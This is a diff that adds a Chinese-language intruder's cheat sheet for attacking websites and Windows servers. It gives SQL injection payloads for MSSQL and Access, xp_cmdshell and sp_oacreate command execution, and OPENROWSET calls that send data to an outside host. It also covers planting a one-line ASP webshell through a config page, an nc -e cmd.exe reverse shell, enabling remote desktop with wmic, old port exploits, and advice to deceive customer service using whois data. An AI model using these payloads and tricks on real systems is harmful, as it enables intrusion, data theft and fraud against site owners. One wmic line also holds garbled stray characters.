@@ -1,0 +1,138 @@
+SA点数据库分离技术相关
+
+
+SA点数据库分离搞法+语句:
+
+注射点不显错,执行下面三条语句页面都返回正常。
+and 1=(select count(*) FROM master.dbo.sysobjects where name= 'xp_regread')
+and 1=(select count(*) FROM master.dbo.sysobjects where name= 'sp_makewebtask')
+and 1=(select count(*) FROM master.dbo.sysobjects where xtype = 'X' AND name = 'xp_cmdshell')
+可以列目录，判断系统为2000，web与数据库分离
+遇到这种情况首先要想办法得到数据库IP来进行下一步得渗透了。
+在注射点上执行
+declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\winnt\system32\cmd /c net user ';--
+页面返回正常，通过上面这个命令执行telnet我一个外网肉鸡得1433端口，然后netstat/an没有得到IP
+还有我用NC监听得其他端口都没有得到IP。
+
+通过注射点执行下面这两个命令页面都返回异常，在肉鸡上面同样也是没有得到IP。
+'insert into opendatasource('sqloledb','server=xxx.xxx.xxx.xxx;uid=sasa;pwd=sasa;database=tempdb').tempdb.dbo.temp select name from master.dbo.sysdatabases--
+
+;insert into OPENROWSET('SQLOLEDB','uid=sa;pwd=pass;Network=DBMSSOCN;Address=xxx.xxx.xxx.xxx,1433;', 'select * from dest_table') select * from src_table;--
+
+现在就猜想是不是数据库是内网而且不能连外网。
+
+
+access导出txt文本代码
+SELECT * into [test.txt] in 'd:\web\' 'text;' from admin
+
+
+
+自动跳转到指定网站代码头
+<body onload='vbscript:document.links(0).href="http://www.google.com":document.links(0).innerHTML="www.sohu.com"'>
+
+
+入侵java or jsp站点时默认配置文件路径:
+\web-inf\web.xml
+tomcat下的配置文件位置:
+\conf\server.xml            (前面加上tomcat路径)
+\Tomcat 5.0\webapps\root\web-inf\struts-config.xml
+
+
+
+检测注入点新方法运算符法,在过滤了and or cookies时用比有效果:
+-1%23
+> 
+<
+1'+or+'1'='1
+id=8%bf
+
+全新注入点检测试法:
+在URL地址后面加上-1，URL变成：http://gzkb.goomoo.cn/news.asp?id=123-1，如果返回的页面和前面不同，是另一则新闻，则表示有注入漏洞，是数字型的注入漏洞;在 URL地址后面加上 -0，URL变成 http://gzkb.goomoo.cn/news.asp?id=123-0，返回的页面和前面的页面相同，加上-1，返回错误页面，则也表示存在注入漏洞，是数字型的。
+
+在URL的地址后面加上'%2B'，URL地址变为：http://gzkb.goomoo.cn/news.asp?id=123'%2B'，返回的页面和1同;加上'2%2B'asdf，URL地址变为：http://gzkb.goomoo.cn/news.asp?id=123'%2Basdf，返回的页面和1不同，或者说未发现该条记录，或者错误，则表示存在注入点，是文本型的。
+
+搜索型注入判断方法:
+北京%' and '1'='1' and '%'='
+北京%' and '1'='2' and '%'='
+
+
+COOKIES注入:
+
+javascript:alert(document.cookie="id="+escape("51 and 1=1"));
+
+2000专业版查看本地登录用户命令:
+net config workstation
+
+
+2003下查看ipsec配置和默认防火墙配置命令:
+netsh firewall show config
+netsh ipsec static show all
+
+不指派指定策略命令:
+netsh ipsec static set policy name=test assign=n  (test是不指派的策略名)
+netsh ipsec static show policy all  显示策略名
+
+
+猜管理员后台小技巧:
+admin/left.asp 
+admin/main.asp
+admin/top.asp
+admin/admin.asp 
+会现出菜单导航,然后迅雷下载全部链接
+
+
+社会工程学:
+用这个查信息 http://tool.chinaz.com/ Whois查域名注册人和维护人
+然后去骗客服
+
+
+统计系统使用的是IT学习者的统计系统，在网上下载了一套回来研究。这样的系统拿webshell一般就二种：1.数据库插一句话木马，客户端连接得到。2.网站配置页面写入木马代码拿webshell。打开数据库目录，发现数据库扩展名是asp的，默认路径:data/#ITlearner.asp,把数据库扩展名改成*.mdb，用明小子的数据库工具打开，发现有防下载的表。管理员的默认密码是：ITlearner。数据库插一句话木马这条路是走不通了，现在只有看第二种方法看行不。输入默认密码进入 http://www.cnc-XX.com/admin/cutecounter /admin.asp?action=ShowConfig,查看原代码： 
+查找 修改maxlength="3"为maxlength="100">这里是为了突破固定长度的字符输入。然后查找 处 修改为action="http://www.cnc-XX.com/admin/cutecounter/admin?Action=SaveConfig">， 
+　　存为html文件打开后在最后详细来访信息记录多少条记录，默认为100条框输入100:eval request(chr(35))，点击保存。提示无法找到，结果发现。
+
+
+
+6. 554端口 用real554.exe入侵。 6129端口 用dameware6129.exe入侵。 系统漏洞 利用135、445端口，用ms03026、ms03039、ms03049、ms04011漏洞， 进行溢出入侵。 3127等端口 可以利用doom病毒开的端口，用nodoom.exe入侵。（可用mydoomscan.exe查）
+
+
+
+CMD加密注册表位置
+(1)HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Command Processor
+AutoRun
+
+(2)HKEY_CURRENT_USER\Software\Microsoft\Command Processor
+AutoRun
+
+
+在找注入时搜索Hidden,把他改成test
+
+
+
+mstsc /v:IP /console 
+
+
+一句话开3389:
+
+最近我在网上看到新出了一种方法,一句话开3389,不过好像听说只能用于2003系统,唉,还是写出来和大家分享一下吧.很简单的,
+
+wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1 adh=Kp e!w 8 kw`=wSH>  
+开远程：
+WMIC /node:"远程机器名" /user:"administrator" /password:"lcx" RDTOGGLE WHERE ServerName='远程机器名' call SetAllowTSConnections 1         
+ 就是这样了,其实还有其他的一些方法开2003的3389,我这里也不多作介绍了,大家有空上网一查就知道了.
+
+
+知道表名，字段，使用SQL语句在ACCESS数据库中加个用户名及密码语句如下:
+Insert into admin(user,pwd) values('test','test')
+
+
+NC反弹
+先在本机执行：　　　　　nc -vv -lp 监听的端口     (自己执行)   
+然后在服务器上执行：　 nc -e cmd.exe 自己的IP 和监听的端口 (对方执行)
+
+
+在脚本入侵过程中要经常常试用%00来确认下参数是否有问题
+
+有时候我们入侵的时候，在webshell没有办法列举网站的目录包括dir也不行的时候，这个时候可以尝试用DOS命令SUBST转移目录
+例如:
+subst k: d:\www\ 用d盘www目录替代k盘
+subst k: /d  解除K盘代替
